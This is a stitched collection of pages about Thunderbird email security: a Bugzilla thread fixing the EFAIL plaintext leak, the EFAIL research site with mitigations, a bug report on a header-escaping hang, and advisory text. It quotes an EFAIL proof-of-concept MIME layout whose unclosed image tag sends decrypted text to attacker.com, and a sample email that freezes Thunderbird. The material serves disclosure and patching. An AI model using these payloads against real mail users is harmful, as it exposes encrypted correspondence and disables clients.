+++ This bug was initially created as a clone of [Bug #1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") +++
As described in [bug 1419417 comment 1](/show_bug.cgi?id=1419417#c1 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
-------------------------------------------------------------
\*Proof of concept 3: Leaking plaintext through src attribute\*
-------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim allows remote content (further attack variants possible, see below)
Attack:
Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <img src='<https://attacker.com/>
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
'>

Should probably change bug number in the patch.
The attack only works with unclosed single quotes. So to make sure the attribute is ended, output internally a single quote (and a double one, just to make sure).

Attached file
[Encrypt test - Copy.eml](attachment.cgi?id=8972090)
— [Details](attachment.cgi?id=8972090&action=edit)

I created myself this test message where I took an encrypted messages that I can decrypt and wrapped it à la [attachment 8930486](/attachment.cgi?id=8930486 "Decryption oracle PoC 3: Leaking plaintext through src attribute") [[details]](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute").
When the message is displayed in the preview, I get this:
<div class="moz-text-html" lang="x-western"><img src="<http://localhost:8080/>
</div><BR><FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;></FIELDSET><div class=&quot;moz-text-plain&quot; wrap=true graphical-quote=true style=&quot;font-family: -moz-fixed; font-size: 14px;&quot; lang=&quot;x-western&quot;><pre wrap class=&quot;moz-quote-pre&quot;>
Content-Type: application/pkcs7-mime; name=&quot;smime.p7m&quot;; smime-type=enveloped-data
Content-Transfer-Encoding: base64
MIAGCSqGSIb3DQEHA6CAMIACAQAxggNvMIIBogIBADCBiTB1MQswCQYDVQQGEwJJTDEWMBQG
[snip]
xfgpAAAAAAAAAAAAAA==
</pre></div><BR><FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;></FIELDSET><div class=&quot;moz-text-html&quot; lang=&quot;x-western&quot;>" shrinktofit="true">
</div>
So the encrypted message makes it into the image src attribute and would be "phoned home". I haven't see that the decrypted text actually appears anywhere.
I'll try with the patch now to see what happens. Most likely, the src attribute will be terminated before the <BR><FIELDSET ...>.

<img src="<http://localhost:8080/>
</div><!--" "--="" shrinktofit="true">
Note that the DOM inspector converts single to double quotes.
I checked a few other messages and saw no bad side effects.
Sadly I cannot confirm the original attack vector, but this patch should fix the issue.

> Sadly I cannot confirm the original attack vector
Just re-tested (on 52.6.0) the original exploit ([attachment 8930486](/attachment.cgi?id=8930486 "Decryption oracle PoC 3: Leaking plaintext through src attribute") [[details]](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute")). If I click to allow remote content I get the following HTTP request containing the full plaintext of S/MIME and PGP/MIME encrypted messages. So decryption seems to be done before loading remote images:

Yes, this should work (and can realistically be rolled out before public disclosure on 2018-05-15!). However, we need to bear in mind it's only a monkeypatch and there may be bypasses. E.g. if the HTML rendering engine evolves and one day decides to handle backticks as quotes we're screwed again. Same if an attacker finds a way to post HTML forms, use some nasty CSS bleeding tricks, etc. HTML just has so many options.
So, in the long term we should think of deeper fixes such as:
- Strict separation (separate DOM?) between different MIME message parts
- Do not decrypt S/MIME or PGP encrypted messages unless the encrypted part is the top-level part in the MIME tree (and has no other message parts as brothers)

This is a way too simple idea. It will fail for example for message forwarded as attachment.
There are several valid scenarios where decryption of non-toplevel MIME parts is desired.

From a security point of view, I'd generally dislike the idea of having partly encrypted (and partly signed) messages. It gives a false sense of security. Either its sig+enc or it's not :)
But I see that reality things are different and from a practical point of view we can probably not apply such more radical countermeasures :/

# BMO/UserGuide/Whiteboard

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)

Each bug has a free-form single line text entry box for adding tags and status information. This wiki page is dedicated to collect a comprehensive list of whiteboard tags used in the Mozilla project.

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

# EFAIL

* [Mitigations](#mitigations)
* [FAQ](#faq)
* [Paper/Talks](#paper)
* [Coverage](#press)

**EFAIL describes vulnerabilities in the end-to-end encryption technologies OpenPGP and S/MIME that leak the plaintext of encrypted emails.**

Email is a plaintext communication medium whose communication paths are partly protected by TLS ([TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security)). For people in hostile environments (journalists, political activists, whistleblowers, ...) who depend on the confidentiality of digital communication, this may not be enough. Powerful attackers such as nation state agencies are known to eavesdrop on email communications of a large number of people. To address this, [OpenPGP](https://en.wikipedia.org/wiki/Pretty_Good_Privacy) offers [end-to-end encryption](https://en.wikipedia.org/wiki/End-to-end_encryption) specifically for sensitive communication in view of these powerful attackers. [S/MIME](https://en.wikipedia.org/wiki/S/MIME) is an alternative standard for email end-to-end encryption that is typically used to secure corporate email communication.

![](media/img/overview1.jpg)

The EFAIL attacks exploit vulnerabilities in the OpenPGP and S/MIME standards to reveal the plaintext of encrypted emails. In a nutshell, EFAIL abuses active content of HTML emails, for example externally loaded images or styles, to exfiltrate plaintext through requested URLs. To create these exfiltration channels, the attacker first needs access to the encrypted emails, for example, by eavesdropping on network traffic, compromising email accounts, email servers, backup systems or client computers. The emails could even have been collected years ago.

![](media/img/overview2.jpg)

The attacker changes an encrypted email in a particular way and sends this changed encrypted email to the victim. The victim's email client decrypts the email and loads any external content, thus exfiltrating the plaintext to the attacker.

#### The CBC/CFB Gadget Attack

There are two different flavors of EFAIL attacks. First, we describe the novel *CBC/CFB gadget* attacks which abuse vulnerabilities in the specification of OpenPGP and S/MIME to exfiltrate the plaintext. The diagram below describes the idea of CBC gadgets in S/MIME. Because of the specifics of the [CBC mode of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation), an attacker can precisely modify plaintext blocks if she knows the plaintext. S/MIME encrypted emails usually start with "Content-type: multipart/signed" so the attacker knows at least one full block of plaintext as shown in *(a)*. She can then form a *canonical plaintext block* whose content is all zeros as shown in (b). We call the block pair *X* and *C0* a CBC gadget. In step (c), she then repeatedly appends CBC gadgets to inject an image tag into the encrypted plaintext. This creates a single encrypted body part that exfiltrates its own plaintext when the user opens the attacker email. OpenPGP uses the [CFB mode of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Feedback_.28CFB.29), which has very similar cryptographic properties as CBC and allows the same attack using CFB gadgets.

![](media/img/smime-attack.png)

The difference here is that any standard-conforming client will be vulnerable and that each vendor may cook their own mitigations that may or may not prevent the attacks. Thus, in the long term, it is necessary to update the specification to find and document changes that fix the underlying root causes of the vulnerabilities.

While the CBC/CFB gadget attacks on PGP and S/MIME are technically very similar, the requirements for a successful attack differ substantially. Attacking S/MIME is straightforward and an attacker can break multiple (in our tests up to 500) S/MIME encrypted emails by sending a single crafted S/MIME email to the victim. As opposed to S/MIME, modern OpenPGP implementations offer a Modification Detection Code (MDC) that can detect modified plaintexts, effectively preventing the CFB gadget attack. However, we found that several clients only gave a warning to the user for invalid MDCs, but still displayed the modified plaintext. This allowed the CFB gadget attack despite the MDC. Furthermore, PGP compresses the plaintext before encrypting it, which complicates guessing known plaintext bytes. Given the current state of our research, the CFB gadget attack against PGP only has a success rate of approximately one in three attempts. We feel that plaintext compression is not a fundamental limitation of the EFAIL attacks but more a technical hitch and that attacks become more efficient in future research.

#### Direct Exfiltration

![](media/img/exfil1.png)

Second, the *direct exfiltration* attack abuses vulnerabilities in Apple Mail, iOS Mail and Mozilla Thunderbird to directly exfiltrate the plaintext of encrypted emails. These vulnerabilities can be fixed in the respective email clients. The attack works like this. The attacker creates a new multipart email with three body parts as shown below. The first is an HTML body part essentially containing an HTML image tag. Note that the src attribute of that image tag is opened with quotes but not closed. The second body part contains the PGP or S/MIME ciphertext. The third is an HTML body part again that closes the src attribute of the first body part.

![](media/img/exfil2.png)

The attacker now sends this email to the victim. The victim's client decrypts the encrypted second body part and stitches the three body parts together in one HTML email as shown below. Note that the src attribute of the image tag in line 1 is closed in line 4, so the URL spans over all four lines.

![](media/img/exfil3.png)

The email client then URL encodes all non-printable characters (e.g., %20 is a whitespace) and requests an image from that URL. As the path of the URL contains the plaintext of the encrypted email, the victim's email client sends the plaintext to the attacker.

The direct exfiltration EFAIL attacks work for encrypted PGP as well as S/MIME emails.

## Mitigations

Here are some strategies to prevent EFAIL attacks:

**Short term: No decryption in email client.** The best way to prevent EFAIL attacks is to only decrypt S/MIME or PGP emails in a separate application outside of your email client. Start by removing your S/MIME and PGP private keys from your email client, then decrypt incoming encrypted emails by copy&pasting the ciphertext into a separate application that does the decryption for you. That way, the email clients cannot open exfiltration channels. This is currently the safest option with the downside that the process gets more involved.

**Short term: Disable HTML rendering.** The EFAIL attacks abuse active content, mostly in the form of HTML images, styles, etc. Disabling the presentation of *incoming* HTML emails in your email client will close the most prominent way of attacking EFAIL. Note that there are other possible backchannels in email clients which are not related to HTML but these are more difficult to exploit.

**Medium term: Patching.** Some vendors will publish patches that either fix the EFAIL vulnerabilities or make them much harder to exploit.

**Long term: Update OpenPGP and S/MIME standards.** The EFAIL attacks exploit flaws and undefined behavior in the [MIME](https://en.wikipedia.org/wiki/MIME), S/MIME, and OpenPGP standards. Therefore, the standards need to be updated, which will take some time.
**Update:** The changes in the current draft of [OpenPGP RFC4880 (bis05)](https://tools.ietf.org/html/draft-ietf-openpgp-rfc4880bis-05) reflect our recommendation to [deprecate the SE packet type](https://tools.ietf.org/html/draft-ietf-openpgp-rfc4880bis-05#section-5.8) and that [modified ciphertexts should not be displayed](https://tools.ietf.org/html/draft-ietf-openpgp-rfc4880bis-05#page-104).

#### What is PGP and S/MIME encryption?

Both technologies add an additional layer of security to your email communication. If used properly, both technologies should guarantee confidentiality and authenticity of your email messages even if an attacker has full access to your email account. The EFAIL attacks break this additional encryption layer.

#### What are the EFAIL attacks?

The EFAIL attacks break PGP and S/MIME email encryption by coercing clients into sending the full plaintext of the emails to the attacker.

#### Are there CVEs for EFAIL?

Yes, there are two official CVE nummers for the CBC/CFB gadget attacks:

CVE-2017-17688: OpenPGP CFB gadget attacks

CVE-2017-17689: S/MIME CBC gadget attacks

Different vendors assigned further CVEs for specific security issues relevant to EFAIL, for example, direct exfiltration attacks.

#### Who is affected?

Journalists, political activists or whistleblowers use an additional encryption layer, often PGP, because they fear that someone gets access to their email communication. The EFAIL attacks can be used to break this additional encryption layer. This leads to the situation where anyone getting access to their email communication can also read the victims emails even if they use additional PGP encryption. The same attacks apply to S/MIME which is typically used in enterprise infrastructures.

#### Can you read my emails?

No. The EFAIL attacks require the attacker to have access to your S/MIME or PGP encrypted emails. You are thus only affected if an attacker already has access to your emails. However, the very goal of PGP or S/MIME encryption is the protection against this kind of attacker. For those users who rely on PGP and S/MIME encryption, the EFAIL attacks may be a big deal!

#### But my emails are TLS encrypted!

TLS is a transport layer encryption technology that encrypts network traffic among email clients and email servers, or between two email servers. However, the emails are processed and stored in plaintext on the servers and in the email accounts. Any attacker getting access to these emails, either via compromising an email account or an email server, can read and change these emails. PGP and S/MIME are used to protect the confidentiality and integrity of emails in case an attacker can already access the emails.

#### Is my email client affected?

Our analysis shows that EFAIL plaintext exfiltration channels exist for 25 of the 35 tested S/MIME email clients and 10 of the 28 tested OpenPGP email clients. While it is necessary to change the OpenPGP and S/MIME standards to reliably fix these vulnerabilities, Apple Mail, iOS Mail and Mozilla Thunderbird had even more severe implementation flaws allowing direct exfiltration of the plaintext that is technically very easy to execute.

#### Can I find out whether I have already been attacked?

Not for sure. You can of course search in your inbox for malicious emails indicating EFAIL attacks. A strong indication for these attacks could be, for example, malformed emails with unclosed img tags followed by encrypted content, or encrypted content that exfiltrates the plaintext to foreign URLs. However, note that emails are encrypted with the keys of sender as well as all receivers. The attacker can target any of these parties to exfiltrate content that is important to you. In advanced attack scenarios where the attacker is in control of the email server, she could have deleted the malicious emails after the victim has processed them.

#### I don't send HTML emails. Am I safe?

No. The attacker can change encrypted text/only emails to HTML emails. You need to disable *viewing* HTML email to increase protection from EFAIL attacks.

#### I have disabled HTML in my email client. Am I safe now?

Depends. S/MIME or PGP encrypted emails are encrypted with the public keys of *all* recipients *and* the sender. The attacker can thus perform the EFAIL attacks if only one of the participants is vulnerable. In order to prevent the EFAIL attacks, *all* participants must use secure email clients.

#### Will signatures prevent these attacks?

No. PGP and S/MIME emails are displayed in the email program independently of whether or not they are signed or whether an existing signature is valid or not. Even if signatures did matter: an attacker can copy the altered ciphertext into a separate email and create a valid signature under his own name.

#### Can you decrypt my own encrypted emails when I lost my private key?

No. The EFAIL attacks target a victim, who is in possession of the private key and who decrypts our prepared emails in an email client. If the private key is lost, the EFAIL attacks won't help recovering encrypted messages.

#### Do I need to revoke my certificate or public key?

No. Using the EFAIL attacks, the attacker can retrieve the plaintext of encrypted OpenPGP and S/MIME messages. She does not get direct access to the private key.

#### I have encrypted data using OpenPGP or S/MIME and I won't decrypt it in the email context. Am I safe?

For now yes. There may be edge cases though that we hadn't looked into. For example, if you encrypted a directory with sensitive files, an attacker could change these encrypted files to contain false information or even malware. If a victim decrypts the directory and opens any of the files, malware or even just an HTML file could be used to exfiltrate plaintext or even compromise the system.

#### What happens if there are quotes in the encrypted email?

Quotes in the plaintext might end the URL that is used to exfiltrate the plaintext so that either the bytes after the quote are not exfiltrated or that the exploit may not work at all. Because of the properties of the CBC and CFB modes of operation, an attacker can split a single S/MIME or PGP ciphertext into multiple parts and exfiltrate each independently with separate HTML tags (but still in one email). If one part contains quotes then only the residual plaintext bytes in that part are missing. There is a whole zoo of techniques that the attacker can use to exfiltrate the full plaintext despite these technical obstacles.

#### Will SPF/DKIM/DMARC mitigate the EFAIL attacks? (Update 2018-05-16)

No. These technologies offer message authenticity and protection against email sender spoofing. Our EFAIL attacker would copy the S/MIME or PGP ciphertext from the original email and past the changed ciphertext into a new message. The attacker now sends the message under his own name with valid values for SPF/DKIM/DMARC.

#### How did EFAIL influence the developments in the current standards?

There is an ongoing work on two new email security standards. Both considered countermeasures presented in our paper.

The [S/MIME standard draft](https://tools.ietf.org/html/draft-ietf-lamps-rfc5751-bis-11) references our EFAIL paper and recommends the usage of authenticated encryption with AES-GCM. Furthermore, it warns that different parts in multipart/mixed emails should be treated as *being of different origins*.

The [OpenPGP standard draft](https://tools.ietf.org/html/draft-ietf-openpgp-rfc4880bis-05) deprecates Symmetrically Encrypted (SE) data packets which are not protected by MDCs. It proposes AEAD protected data packets and mentions that *the implementation should not allow users to access erroneous data*.

## Responsible Disclosure

We have responsibly disclosed our findings to the affected vendors who have applied (or are in the process of applying) countermeasures. Please note that in general these countermeasures are specific hotfixes and we cannot rule out that extended attacks with further backchannels or exfiltrations will be found. (**Update:** After the disclosure, bypasses were indeed published for [Thunderbird](https://www.golem.de/news/pgp-smime-thunderbird-update-notwendig-um-efail-zu-verhindern-1805-134472.html) and [Apple Mail](https://theintercept.com/2018/05/25/in-apple-mail-theres-no-protecting-pgp-encrypted-messages/).) Moreover, even if all backchannels are closed, both standards are still vulnerable to attacks where the attacker can modify email content or inject malicious code into attachments which get executed in a context beyond email client.

We informed German CERT and BSI about our attacks in December 2017. They forwarded all the relevant information to other CERTs and companies.

We disclosed our attacks to the GnuPG developers on the 24th of November 2017. Further clients are listed below. For reference we also include case numbers and CVEs if they have been assigned. Note that as of May 2018 fixes have been deployed for various mail clients, for details check the vendors' websites.

#### [#CVE-2018-5174: Windows Defender SmartScreen UI runs with less secure behavior for downloaded files in Windows 10 April 2018 Update](#CVE-2018-5174)

Reporter
Jimmy
Impact
moderate
##### Description

In the Windows 10 April 2018 Update, Windows Defender SmartScreen honors the `SEE_MASK_FLAG_NO_UI` flag associated with downloaded files and will not show any UI. Files that are unknown and potentially dangerous will be allowed to run because SmartScreen will not prompt the user for a decision, and if the user is offline all files will be allowed to be opened because Windows won’t prompt the user to ask what to do. Firefox incorrectly sets this flag when downloading files, leading to less secure behavior from SmartScreen.
*Note: this issue only affects Windows 10 users running the April 2018 update or later. It does not affect other Windows users or other operating systems.*

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Christoph Diehl, Randell Jesup, Tyson Smith, Alex Gaynor, Ronald Crane, Julian Hector, Kannan Vijayan, and Jason Kratzer reported memory safety bugs present in Firefox 59, Firefox ESR 52.7, and Thunderbird 52.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard

MailNews Core :: MIME
Problems with parsing the MIME structure and displaying messages. When this problem happens, it's often useful to attach a copy of the mail message generating the problem. If you have Communicator 4.x, you can select the message and save it as an .eml file (just save with the .eml extension). A few examples: 1. The contents of a message do not display properly. Certain items do not show up.

| [Description](/show_bug.cgi?id=1411720#c0)• 7 years ago |
|  | |

An issue was discovered to let an attacker craft an email which causes the victim’s Thunderbird process to hang on receiving the message. For some test cases, the hang persisted across a restart of the Thunderbird software, thus making it impossible to use the application unless the email was deleted via the mail provider’s web interface. Below is an example of an email culprit.
Email which causes a hang:
Content-Type: text/plain
Subject: HANG!
From: evil@attacker
To: sad@victim
CC: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
meowmeow
Once the email is processed, Thunderbird freezes and consumes 100% of the CPU
resources. Moreover, the amount of used memory increases. This problem is caused by an escaping algorithm which processes the header field in a manner presented next
@@ => "@"@
@@@ => "\"@\"@"@
@@@@ => "\"\\\"@\\\"@\"@"@
@@@@@@ => "\"\\\"\\\\\\\"\\\\\\\\\\\\\\\"@\\\\\\\\\\\\\\\"@\\\\\\\"@\\\"@\"@"@
Adding @ characters to the header entry increases the length of the encoded string exponentially, thus resulting in high CPU and memory consumption. All header types permitted to contain email addresses, e.g. From, To, BCC, Resent-From, are affected by this issue. It is recommended to review and fix the escaping algorithm to avoid Denial of Service and foster more robust parsing.
For the original report as PDF; see [bug 1411701](/show_bug.cgi?id=1411701 "RESOLVED FIXED").

In [bug 1293245 comment 10](/show_bug.cgi?id=1293245#c10 "RESOLVED FIXED - message with malformed email address makes Thunderbird hang 100% CPU load") I provide expanded information about a crash I experienced while testing. I haven't yet been able to speak with the crashing users to confirm, but I think it is possible some users may repeatedly hang or crash on restart.

The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service

via application crash, install lightweight themes without user

interaction, or execute arbitrary code. ([CVE-2018-5150](/security/CVE-2018-5150), [CVE-2018-5154](/security/CVE-2018-5154),

[CVE-2018-5155](/security/CVE-2018-5155), [CVE-2018-5159](/security/CVE-2018-5159), [CVE-2018-5168](/security/CVE-2018-5168), [CVE-2018-5178](/security/CVE-2018-5178))

An issue was discovered when processing message headers in Thunderbird. If

a user were tricked in to opening a specially crafted message, an attacker

could potentially exploit this to cause a denial of service via

application hang. ([CVE-2018-5161](/security/CVE-2018-5161))

It was discovered encrypted messages could leak plaintext via the src

attribute of remote images or links. An attacker could potentially exploit

this to obtain sensitive information. ([CVE-2018-5162](/security/CVE-2018-5162))

It was discovered that the filename of an attachment could be spoofed. An

attacker could potentially exploit this by tricking the user in to opening

an attachment of a different type to the one expected. ([CVE-2018-5170](/security/CVE-2018-5170))

Multiple security issues were discovered in Skia. If a user were tricked

in to opening a specially crafted message, an attacker could potentially

exploit these to cause a denial of service via application crash, or

execute arbitrary code. ([CVE-2018-5183](/security/CVE-2018-5183))

It was discovered that S/MIME encrypted messages with remote content could

leak plaintext via a chosen-ciphertext attack. An attacker could

potentially exploit this to obtain sensitive information. ([CVE-2018-5184](/security/CVE-2018-5184))

It was discovered that plaintext of decrypted emails could leak by

submitting an embedded form. An attacker could potentially exploit this to

obtain sensitive information. ([CVE-2018-5185](/security/CVE-2018-5185))
